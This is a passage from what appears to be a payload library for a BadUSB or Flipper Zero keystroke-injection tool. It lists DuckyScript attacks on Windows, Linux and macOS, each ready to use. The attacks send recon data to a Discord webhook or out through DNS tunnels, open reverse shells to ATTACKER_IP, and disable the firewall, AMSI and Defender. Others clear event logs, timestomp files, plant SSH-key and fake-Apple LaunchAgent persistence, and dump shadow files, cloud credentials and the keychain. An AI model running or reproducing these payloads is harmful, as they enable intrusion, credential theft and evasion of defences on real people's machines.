    script: `REM Discord Webhook Exfiltration
REM Replace WEBHOOK_URL_HERE with your Discord webhook
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $webhook = 'WEBHOOK_URL_HERE'; $hostname = $env:COMPUTERNAME; $user = $env:USERNAME; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' } | Select-Object -First 1).IPAddress; $os = (Get-WmiObject Win32_OperatingSystem).Caption; $av = (Get-MpComputerStatus -ErrorAction SilentlyContinue).AntivirusEnabled; $body = @{content="**RECON: $hostname**"; embeds=@(@{title="System Info";color=3447003;fields=@(@{name="Hostname";value=$hostname;inline=$true},@{name="User";value=$user;inline=$true},@{name="IP";value=$ip;inline=$true},@{name="OS";value=$os;inline=$false},@{name="AV Enabled";value="$av";inline=$true})})} | ConvertTo-Json -Depth 5; Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'exfil-clipboard-monitor',
    name: 'Clipboard Content Monitor',
    category: 'exfiltration',
    description: 'Monitors and logs clipboard contents every 2 seconds for 60 seconds. Captures text, URLs, and potential credentials copied by the user.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~65s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Clipboard Monitor - 60 second capture
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING Add-Type -AssemblyName System.Windows.Forms; $log = "$env:TEMP\\clipboard_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"; $last = ''; $end = (Get-Date).AddSeconds(60); "=== CLIPBOARD MONITOR STARTED $(Get-Date) ===" | Out-File $log; while((Get-Date) -lt $end){ try { $clip = [System.Windows.Forms.Clipboard]::GetText(); if($clip -and $clip -ne $last){ $last = $clip; "[$(Get-Date -Format 'HH:mm:ss')] $clip" | Out-File $log -Append } } catch {}; Start-Sleep -Seconds 2 }; "=== MONITOR ENDED $(Get-Date) ===" | Out-File $log -Append; Invoke-Item $log
ENTER`
  },
  {
    id: 'exfil-outlook-draft',
    name: 'Outlook Draft Email Exfiltration',
    category: 'exfiltration',
    description: 'Collects system recon data and saves it as an Outlook draft email. Does not send - draft can be retrieved later or used as dead-drop communication.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Outlook Draft Exfiltration - Creates draft, does NOT send
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING try { $ol = New-Object -ComObject Outlook.Application; $mail = $ol.CreateItem(0); $mail.Subject = "Meeting Notes $(Get-Date -Format 'MM/dd')"; $info = "HOST: $env:COMPUTERNAME" + [char]10 + "USER: $env:USERNAME" + [char]10 + "DOMAIN: $env:USERDOMAIN" + [char]10 + "IP: $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'} | Select-Object -First 1).IPAddress)" + [char]10 + "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)" + [char]10 + "AV: $((Get-MpComputerStatus).AMServiceEnabled)" + [char]10 + [char]10 + "PROCESSES:" + [char]10 + "$(Get-Process | Select-Object -First 30 Name, Id | Out-String)"; $mail.Body = $info; $mail.Save(); "Draft saved successfully" | Out-File "$env:TEMP\\exfil_status.txt" } catch { "Outlook not available: $_" | Out-File "$env:TEMP\\exfil_status.txt" }
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'exfil-dns-tunnel',
    name: 'DNS Exfiltration Tunnel',
    category: 'exfiltration',
    description: 'Encodes system data into DNS queries sent to an attacker-controlled domain. Bypasses most firewalls as DNS is rarely blocked. Replace DOMAIN with your DNS server.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~10s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM DNS Exfiltration Tunnel
REM Replace YOUR_DOMAIN_HERE with your DNS exfil domain
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $domain = 'YOUR_DOMAIN_HERE'; $data = "$env:COMPUTERNAME|$env:USERNAME|$((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'} | Select-Object -First 1).IPAddress)"; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)) -replace '\\+','-' -replace '/','_' -replace '=',''; $chunks = [regex]::Matches($encoded, '.{1,60}'); $id = Get-Random -Maximum 9999; for($i=0; $i -lt $chunks.Count; $i++){ $query = "$id.$i.$($chunks.Count).$($chunks[$i].Value).$domain"; try { Resolve-DnsName $query -ErrorAction SilentlyContinue | Out-Null } catch {}; Start-Sleep -Milliseconds 200 }; "DNS exfil complete: $($chunks.Count) queries sent" | Out-File "$env:TEMP\\dns_exfil.log"
ENTER
DELAY 2000
STRING exit
ENTER`
  },

  // ==================== NETWORK ATTACK — PROFESSIONAL PENTEST ====================
  {
    id: 'net-dns-poison',
    name: 'DNS Poisoning via Hosts File',
    category: 'network',
    description: 'Modifies the Windows hosts file to redirect specified domains to attacker-controlled IPs. Requires admin. Includes backup and restore functionality.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM DNS Poisoning via Hosts File - Requires Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $hosts=\\\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\\\"; Copy-Item $hosts \\\"$hosts.bak\\\" -Force; $entries = @(\\\"ATTACKER_IP target-domain.com\\\", \\\"ATTACKER_IP login.target-domain.com\\\", \\\"ATTACKER_IP mail.target-domain.com\\\"); foreach($e in $entries){ Add-Content $hosts $e }; ipconfig /flushdns | Out-Null; \\\"Hosts file poisoned with $($entries.Count) entries\\\" | Out-File $env:TEMP\\\\dns_poison.log' -Verb RunAs"
ENTER`
  },
  {
    id: 'net-proxy-config',
    name: 'System Proxy Injection',
    category: 'network',
    description: 'Configures the system proxy to route HTTP/HTTPS traffic through an attacker-controlled proxy server. Captures all browser traffic. Replace PROXY_IP:PORT.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM System Proxy Injection
REM Replace PROXY_IP:PORT with your proxy address
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $proxy = 'PROXY_IP:PORT'; $regPath = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings'; Set-ItemProperty -Path $regPath -Name ProxyEnable -Value 1; Set-ItemProperty -Path $regPath -Name ProxyServer -Value $proxy; Set-ItemProperty -Path $regPath -Name ProxyOverride -Value '<local>'; "Proxy set to $proxy" | Out-File "$env:TEMP\\proxy_set.log"; "Verify:" | Out-File "$env:TEMP\\proxy_set.log" -Append; Get-ItemProperty $regPath | Select-Object ProxyEnable, ProxyServer | Format-List | Out-String | Out-File "$env:TEMP\\proxy_set.log" -Append
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'net-firewall-disable',
    name: 'Windows Firewall Disable',
    category: 'network',
    description: 'Disables Windows Firewall on all profiles (Domain, Private, Public). Requires admin. Logs previous state for potential restoration.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Windows Firewall Disable - Requires Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $log=\\\"$env:TEMP\\\\fw_disable.log\\\"; \\\"=== BEFORE ===\\\" | Out-File $log; Get-NetFirewallProfile | Select-Object Name,Enabled | Format-Table | Out-String | Out-File $log -Append; Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False; \\\"=== AFTER ===\\\" | Out-File $log -Append; Get-NetFirewallProfile | Select-Object Name,Enabled | Format-Table | Out-String | Out-File $log -Append; \\\"Firewall disabled at $(Get-Date)\\\" | Out-File $log -Append' -Verb RunAs"
ENTER`
  },
  {
    id: 'net-share-scanner',
    name: 'Network Share Scanner',
    category: 'network',
    description: 'Scans the local subnet for accessible SMB shares on common ports. Tests read/write access to discovered shares. Useful for lateral movement planning.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~30s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Network Share Scanner
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\share_scan.txt"; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1); $subnet = $ip.IPAddress -replace '\\d+$',''; "=== SHARE SCAN $(Get-Date) ===" | Out-File $out; "Local IP: $($ip.IPAddress)/$($ip.PrefixLength)" | Out-File $out -Append; "Scanning $($subnet)0/24..." | Out-File $out -Append; 1..254 | ForEach-Object { $target = "$subnet$_"; if(Test-Connection $target -Count 1 -Quiet -TimeoutSeconds 1){ "Host $target - UP" | Out-File $out -Append; try { $shares = net view "\\\\$target" 2>$null; if($shares){ [Environment]::NewLine + "$target SHARES:" | Out-File $out -Append; $shares | Out-File $out -Append } } catch {} } }; "=== SCAN COMPLETE ===" | Out-File $out -Append; Invoke-Item $out
ENTER`
  },
  {
    id: 'net-port-forward',
    name: 'Netsh Port Forwarding',
    category: 'network',
    description: 'Sets up port forwarding using netsh to redirect traffic from a local port to a remote target. Useful for pivoting through compromised hosts. Requires admin.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Netsh Port Forwarding - Requires Admin
REM Replace LOCAL_PORT, REMOTE_IP, REMOTE_PORT
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $lport=\\\"LOCAL_PORT\\\"; $rip=\\\"REMOTE_IP\\\"; $rport=\\\"REMOTE_PORT\\\"; netsh interface portproxy add v4tov4 listenport=$lport listenaddress=0.0.0.0 connectport=$rport connectaddress=$rip; $log=\\\"$env:TEMP\\\\portfwd.log\\\"; \\\"Port forward: 0.0.0.0:$lport -> $rip" + ":" + "$rport\\\" | Out-File $log; \\\"=== ALL PORT FORWARDS ===\\\" | Out-File $log -Append; netsh interface portproxy show all | Out-File $log -Append; netsh advfirewall firewall add rule name=\\\"PortForward $lport\\\" dir=in action=allow protocol=tcp localport=$lport | Out-Null; \\\"Firewall rule added\\\" | Out-File $log -Append' -Verb RunAs"
ENTER`
  },

  // ==================== EVASION — PROFESSIONAL PENTEST ====================
  {
    id: 'evasion-amsi-bypass',
    name: 'AMSI Bypass for PowerShell',
    category: 'evasion',
    description: 'Bypasses the Antimalware Scan Interface (AMSI) in the current PowerShell session. Allows execution of scripts that would normally be flagged by AV. Multiple techniques.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~3s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM AMSI Bypass - Multiple Techniques
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $a=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils'); $f=$a.GetField('amsi'+[char]73+'nitFailed','NonPublic,Static'); $f.SetValue($null,$true); if([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null) -eq $true){ "AMSI bypass SUCCESS" } else { "AMSI bypass FAILED - trying alternative..."; [Runtime.InteropServices.Marshal]::WriteByte(([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null)),0x0) }
ENTER`
  },
  {
    id: 'evasion-defender-exclusion',
    name: 'Windows Defender Exclusion',
    category: 'evasion',
    description: 'Adds folder and process exclusions to Windows Defender to prevent scanning of attacker tools. Requires admin. Excludes common staging directories.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Windows Defender Exclusion - Requires Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $log=\\\"$env:TEMP\\\\defender_excl.log\\\"; Add-MpPreference -ExclusionPath \\\"C:\\\\Windows\\\\Temp\\\" -Force; Add-MpPreference -ExclusionPath \\\"$env:TEMP\\\" -Force; Add-MpPreference -ExclusionPath \\\"$env:USERPROFILE\\\\Downloads\\\" -Force; Add-MpPreference -ExclusionProcess \\\"powershell.exe\\\" -Force; Add-MpPreference -ExclusionProcess \\\"cmd.exe\\\" -Force; Add-MpPreference -ExclusionExtension \\\".ps1\\\" -Force; Add-MpPreference -ExclusionExtension \\\".exe\\\" -Force; \\\"Exclusions added:\\\" | Out-File $log; Get-MpPreference | Select-Object ExclusionPath,ExclusionProcess,ExclusionExtension | Format-List | Out-String | Out-File $log -Append' -Verb RunAs"
ENTER`
  },
  {
    id: 'evasion-execpolicy-bypass',
    name: 'PowerShell Execution Policy Bypass',
    category: 'evasion',
    description: 'Bypasses PowerShell execution policy using multiple techniques: Set-ExecutionPolicy, -ExecutionPolicy flag, environment variable, and registry modification.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~4s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM PowerShell Execution Policy Bypass
DELAY 1000
GUI r
DELAY 500
STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden
ENTER
DELAY 1000
STRING "Current policy: $(Get-ExecutionPolicy)" | Out-File "$env:TEMP\\execpol.log"; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser -Force; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; "New policy: $(Get-ExecutionPolicy)" | Out-File "$env:TEMP\\execpol.log" -Append; "Process policy: $(Get-ExecutionPolicy -Scope Process)" | Out-File "$env:TEMP\\execpol.log" -Append; "User policy: $(Get-ExecutionPolicy -Scope CurrentUser)" | Out-File "$env:TEMP\\execpol.log" -Append; "Bypass active - scripts can now execute" | Out-File "$env:TEMP\\execpol.log" -Append
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'evasion-eventlog-clear',
    name: 'Event Log Clearing',
    category: 'evasion',
    description: 'Clears Windows Security, System, Application, and PowerShell event logs to remove evidence of attack activities. Requires admin. Logs are not recoverable.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~6s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Event Log Clearing - Requires Admin
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command $log=\\\"$env:TEMP\\\\logclear.txt\\\"; $logs=@(\\\"Security\\\",\\\"System\\\",\\\"Application\\\",\\\"Windows PowerShell\\\",\\\"Microsoft-Windows-PowerShell/Operational\\\",\\\"Microsoft-Windows-Sysmon/Operational\\\"); foreach($l in $logs){ try { $count=(Get-WinEvent -LogName $l -ErrorAction SilentlyContinue).Count; Clear-EventLog -LogName $l -ErrorAction SilentlyContinue; wevtutil cl $l 2>$null; \\\"Cleared $l ($count events)\\\" | Out-File $log -Append } catch { \\\"Failed to clear $l - $_\\\" | Out-File $log -Append } }; \\\"Log clearing complete at $(Get-Date)\\\" | Out-File $log -Append' -Verb RunAs"
ENTER`
  },
  {
    id: 'evasion-timestomp',
    name: 'File Timestamp Manipulation',
    category: 'evasion',
    description: 'Modifies file timestamps (Created, Modified, Accessed) to match legitimate system files. Helps planted files blend in with existing system files during forensics.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM File Timestamp Manipulation (Timestomp)
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING function Set-FileTimestamp { param([string]$Path, [datetime]$Date); if(Test-Path $Path){ $f = Get-Item $Path -Force; $f.CreationTime = $Date; $f.LastWriteTime = $Date; $f.LastAccessTime = $Date; "Timestomped: $Path -> $Date" } else { "File not found: $Path" } }; $refTime = (Get-Item "C:\\Windows\\System32\\kernel32.dll").LastWriteTime; $target = 'TARGET_FILE_PATH'; Set-FileTimestamp -Path $target -Date $refTime; "Reference: kernel32.dll = $refTime" | Out-File "$env:TEMP\\timestomp.log"; Get-Item $target | Select-Object Name, CreationTime, LastWriteTime, LastAccessTime | Format-List | Out-String | Out-File "$env:TEMP\\timestomp.log" -Append
ENTER
DELAY 1000
STRING exit
ENTER`
  },

  // ==================== LINUX — PROFESSIONAL PENTEST ====================
  {
    id: 'linux-full-recon',
    name: 'Linux Full Reconnaissance',
    category: 'recon',
    description: 'Comprehensive Linux recon: kernel info, users, network config, listening ports, cron jobs, SUID binaries, writable directories, installed packages.',
    targetOS: ['linux'],
    riskLevel: 'low',
    executionTime: '~15s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Linux Full Reconnaissance
DELAY 1000
CTRL-ALT t
DELAY 1000
STRING out="/tmp/recon_$(date +%Y%m%d_%H%M%S).txt"; echo "=== SYSTEM ===" > $out; uname -a >> $out; echo "=== HOSTNAME ===" >> $out; hostname -f 2>/dev/null >> $out; echo "=== USERS ===" >> $out; cat /etc/passwd >> $out; echo "=== CURRENT USER ===" >> $out; id >> $out; echo "=== SUDO PRIVS ===" >> $out; sudo -l 2>/dev/null >> $out; echo "=== NETWORK ===" >> $out; ip addr 2>/dev/null || ifconfig >> $out; echo "=== ROUTES ===" >> $out; ip route 2>/dev/null || route -n >> $out; echo "=== LISTENING PORTS ===" >> $out; ss -tlnp 2>/dev/null || netstat -tlnp >> $out; echo "=== ARP ===" >> $out; ip neigh 2>/dev/null || arp -a >> $out; echo "=== CRON JOBS ===" >> $out; crontab -l 2>/dev/null >> $out; ls -la /etc/cron* 2>/dev/null >> $out; echo "=== SUID BINARIES ===" >> $out; find / -perm -4000 -type f 2>/dev/null >> $out; echo "=== WRITABLE DIRS ===" >> $out; find / -writable -type d 2>/dev/null | head -30 >> $out; echo "=== INSTALLED PACKAGES ===" >> $out; dpkg -l 2>/dev/null || rpm -qa 2>/dev/null >> $out; cat $out
ENTER`
  },
  {
    id: 'linux-reverse-shell',
    name: 'Linux Bash Reverse Shell',
    category: 'reverse-shells',
    description: 'Spawns a bash TCP reverse shell to a specified attacker IP and port. Replace ATTACKER_IP and ATTACKER_PORT. Includes fallback methods: python, netcat, perl.',
    targetOS: ['linux'],
    riskLevel: 'critical',
    executionTime: '~3s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Linux Bash Reverse Shell
REM Replace ATTACKER_IP and ATTACKER_PORT
DELAY 1000
CTRL-ALT t
DELAY 1000
STRING bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' 2>/dev/null || python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' 2>/dev/null || nc -e /bin/bash ATTACKER_IP ATTACKER_PORT 2>/dev/null || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f
ENTER`
  },
  {
    id: 'linux-ssh-persistence',
    name: 'Linux SSH Key Persistence',
    category: 'persistence',
    description: 'Generates an SSH key pair and adds the public key to authorized_keys for persistent access. Creates .ssh directory if needed with correct permissions.',
    targetOS: ['linux'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Linux SSH Key Persistence
REM Adds attacker SSH key for persistent access
DELAY 1000
CTRL-ALT t
DELAY 1000
STRING mkdir -p ~/.ssh && chmod 700 ~/.ssh; echo "PASTE_YOUR_PUBLIC_KEY_HERE" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys; echo "SSH key persistence installed"; echo "Authorized keys:"; cat ~/.ssh/authorized_keys; echo "SSH service status:"; systemctl status sshd 2>/dev/null || service ssh status 2>/dev/null
ENTER`
  },
  {
    id: 'linux-cred-harvest',
    name: 'Linux Credential Harvest',
    category: 'credentials',
    description: 'Harvests credential-related files: /etc/shadow (if readable), bash history, SSH keys, .netrc, .pgpass, AWS/GCP/Azure credentials, and environment variables.',
    targetOS: ['linux'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Linux Credential Harvest
DELAY 1000
CTRL-ALT t
DELAY 1000
STRING out="/tmp/creds_$(date +%s).txt"; echo "=== SHADOW FILE ===" > $out; cat /etc/shadow 2>/dev/null >> $out || echo "No read access" >> $out; echo "=== BASH HISTORY ===" >> $out; cat ~/.bash_history 2>/dev/null | tail -100 >> $out; echo "=== SSH PRIVATE KEYS ===" >> $out; find /home -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read f; do echo "FOUND: $f"; head -2 "$f"; done >> $out; echo "=== SSH CONFIGS ===" >> $out; cat ~/.ssh/config 2>/dev/null >> $out; echo "=== .NETRC ===" >> $out; cat ~/.netrc 2>/dev/null >> $out; echo "=== AWS CREDS ===" >> $out; cat ~/.aws/credentials 2>/dev/null >> $out; echo "=== GCP CREDS ===" >> $out; cat ~/.config/gcloud/credentials.db 2>/dev/null | strings >> $out; echo "=== AZURE CREDS ===" >> $out; cat ~/.azure/accessTokens.json 2>/dev/null >> $out; echo "=== ENV VARS WITH SECRETS ===" >> $out; env | grep -iE 'key|token|secret|pass|cred|auth' >> $out; echo "=== .PGPASS ===" >> $out; cat ~/.pgpass 2>/dev/null >> $out; echo "=== GNUPG ===" >> $out; ls -la ~/.gnupg/ 2>/dev/null >> $out; cat $out
ENTER`
  },
  {
    id: 'linux-privesc-check',
    name: 'Linux Privilege Escalation Check',
    category: 'recon',
    description: 'Comprehensive privesc enumeration: SUID/SGID binaries, writable cron jobs, sudo permissions, capabilities, kernel version, Docker group membership, writable /etc/passwd.',
    targetOS: ['linux'],
    riskLevel: 'medium',
    executionTime: '~15s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Linux Privilege Escalation Check
DELAY 1000
CTRL-ALT t
DELAY 1000
STRING out="/tmp/privesc_$(date +%s).txt"; echo "=== KERNEL ===" > $out; uname -a >> $out; echo "=== SUDO PERMISSIONS ===" >> $out; sudo -l 2>/dev/null >> $out; echo "=== SUID BINARIES ===" >> $out; find / -perm -4000 -type f 2>/dev/null >> $out; echo "=== SGID BINARIES ===" >> $out; find / -perm -2000 -type f 2>/dev/null >> $out; echo "=== CAPABILITIES ===" >> $out; getcap -r / 2>/dev/null >> $out; echo "=== WRITABLE CRON ===" >> $out; find /etc/cron* -writable 2>/dev/null >> $out; ls -la /etc/crontab >> $out; cat /etc/crontab >> $out; echo "=== WRITABLE /etc/passwd ===" >> $out; ls -la /etc/passwd >> $out; test -w /etc/passwd && echo "WRITABLE!" >> $out; echo "=== DOCKER GROUP ===" >> $out; id | grep -i docker >> $out; echo "=== LXD GROUP ===" >> $out; id | grep -i lxd >> $out; echo "=== WORLD WRITABLE FILES ===" >> $out; find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -50 >> $out; echo "=== PROCESSES AS ROOT ===" >> $out; ps aux | grep "^root" | head -30 >> $out; echo "=== INTERNAL PORTS ===" >> $out; ss -tlnp 2>/dev/null >> $out; cat $out
ENTER`
  },

  // ==================== macOS — PROFESSIONAL PENTEST ====================
  {
    id: 'macos-full-recon',
    name: 'macOS Full Reconnaissance',
    category: 'recon',
    description: 'Comprehensive macOS recon: system profiler, network config, users, installed apps, running processes, login items, SIP status, and Gatekeeper settings.',
    targetOS: ['macos'],
    riskLevel: 'low',
    executionTime: '~15s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM macOS Full Reconnaissance
DELAY 1000
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING out="/tmp/recon_$(date +%Y%m%d_%H%M%S).txt"; echo "=== SYSTEM ===" > $out; sw_vers >> $out; uname -a >> $out; echo "=== HARDWARE ===" >> $out; system_profiler SPHardwareDataType >> $out; echo "=== NETWORK ===" >> $out; ifconfig >> $out; echo "=== ROUTES ===" >> $out; netstat -rn >> $out; echo "=== DNS ===" >> $out; scutil --dns | head -50 >> $out; echo "=== USERS ===" >> $out; dscl . list /Users | grep -v '^_' >> $out; echo "=== CURRENT USER ===" >> $out; id >> $out; echo "=== INSTALLED APPS ===" >> $out; ls /Applications/ >> $out; echo "=== RUNNING PROCESSES ===" >> $out; ps aux >> $out; echo "=== LOGIN ITEMS ===" >> $out; osascript -e 'tell application "System Events" to get the name of every login item' 2>/dev/null >> $out; echo "=== SIP STATUS ===" >> $out; csrutil status >> $out; echo "=== GATEKEEPER ===" >> $out; spctl --status >> $out; echo "=== FIREWALL ===" >> $out; /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate >> $out; open $out
ENTER`
  },
  {
    id: 'macos-reverse-shell',
    name: 'macOS Reverse Shell',
    category: 'reverse-shells',
    description: 'Spawns a reverse shell on macOS using bash or python3. Opens Terminal via Spotlight, establishes TCP connection. Replace ATTACKER_IP and ATTACKER_PORT.',
    targetOS: ['macos'],
    riskLevel: 'critical',
    executionTime: '~4s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM macOS Reverse Shell
REM Replace ATTACKER_IP and ATTACKER_PORT
DELAY 1000
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' 2>/dev/null || python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
ENTER`
  },
  {
    id: 'macos-keychain-dump',
    name: 'macOS Keychain Dump',
    category: 'credentials',
    description: 'Dumps the macOS login keychain using security command. Lists all generic and internet passwords. May prompt user for keychain password depending on items.',
    targetOS: ['macos'],
    riskLevel: 'high',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM macOS Keychain Dump
DELAY 1000
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING out="/tmp/keychain_dump.txt"; echo "=== KEYCHAIN LIST ===" > $out; security list-keychains >> $out; echo "=== GENERIC PASSWORDS ===" >> $out; security dump-keychain -d 2>/dev/null >> $out; echo "=== INTERNET PASSWORDS ===" >> $out; security find-internet-password -ga "" 2>&1 | head -50 >> $out; echo "=== WIFI PASSWORDS ===" >> $out; networksetup -listpreferredwirelessnetworks en0 2>/dev/null | awk '{print $1}' | while read ssid; do [ -n "$ssid" ] && echo -n "$ssid: " && security find-generic-password -wa "$ssid" 2>/dev/null || echo "(access denied)"; done >> $out; open $out
ENTER`
  },
  {
    id: 'macos-launchagent-persist',
    name: 'macOS LaunchAgent Persistence',
    category: 'persistence',
    description: 'Creates a LaunchAgent plist that runs a payload at user login. Uses a com.apple-like naming convention for stealth. Payload survives reboots.',
    targetOS: ['macos'],
    riskLevel: 'high',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM macOS LaunchAgent Persistence
DELAY 1000
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING mkdir -p ~/Library/LaunchAgents; cat > ~/Library/LaunchAgents/com.apple.security.updater.plist << 'PLIST'
ENTER
STRING <?xml version="1.0" encoding="UTF-8"?>
ENTER
STRING <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
ENTER
STRING <plist version="1.0">
ENTER
STRING <dict>
ENTER
STRING   <key>Label</key><string>com.apple.security.updater</string>
ENTER
STRING   <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>REPLACE_WITH_PAYLOAD_COMMAND</string></array>
ENTER
STRING   <key>RunAtLoad</key><true/>
ENTER
STRING   <key>KeepAlive</key><false/>
ENTER
STRING </dict>
ENTER
STRING </plist>
ENTER
STRING PLIST
ENTER
STRING chmod 644 ~/Library/LaunchAgents/com.apple.security.updater.plist; launchctl load ~/Library/LaunchAgents/com.apple.security.updater.plist 2>/dev/null; echo "LaunchAgent installed and loaded"
ENTER`
  },
  {
